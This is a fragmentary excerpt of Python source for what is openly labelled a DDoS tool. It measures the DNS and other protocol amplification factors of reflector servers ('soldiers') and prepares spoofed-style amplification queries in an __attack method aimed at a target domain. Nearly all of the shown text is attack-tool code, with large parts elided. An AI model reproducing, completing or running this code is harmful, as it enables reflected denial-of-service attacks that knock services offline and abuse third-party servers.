...
USAGE = '''
%(prog)s target.com [options]        # DDoS
%(prog)s benchmark [options]         # Calculate AMPLIFICATION factor
'''
                ...
                if soldier:
                    if proto == 'dns':
                        for domain in ddos.domains:
                            i += 1
                            recvd, sent = ddos.get_amp_size(proto, soldier, domain)
                            if recvd / sent:
                                print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
                                                                      amp_factor(recvd, sent), domain))
                            else:
                                continue
                    else:
                        recvd, sent = ddos.get_amp_size(proto, soldier)
                        print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
                                                              amp_factor(recvd, sent), 'N/A'))
                        i += 1
                else:
                    break
...
class DDoS:
    ...
    def get_amp_size(self, proto, soldier, domain=''):
        ...
        if proto == 'dns':
            packet = self.__get_dns_query(domain)
        else:
            packet = PAYLOAD[proto]
        try:
            sock.sendto(packet, (soldier, PORT[proto]))
    ...
    def __get_qname(self, domain):
        ...
        return qname
    def __get_dns_query(self, domain):
        id = struct.pack('H', randint(0, 65535))
        qname = self.__get_qname(domain)
    ...
    def __attack(self):
        ...
        for proto in _files:  # Open Amplification files
            with open(_files[proto][FILE_NAME], 'r') as f:
                    ...
                    if proto == 'dns':
                        ...
                        for domain in self.domains:
                            if domain not in amplification[proto][soldier]:
                                size, _ = self.get_amp_size(proto, soldier, domain)
                                if size == 0:
                                    break
                            ...
                            amp = self.__get_dns_query(domain)
                        ...
                        if soldier not in amplification[proto]:
                            size, _ = self.get_amp_size(proto, soldier)
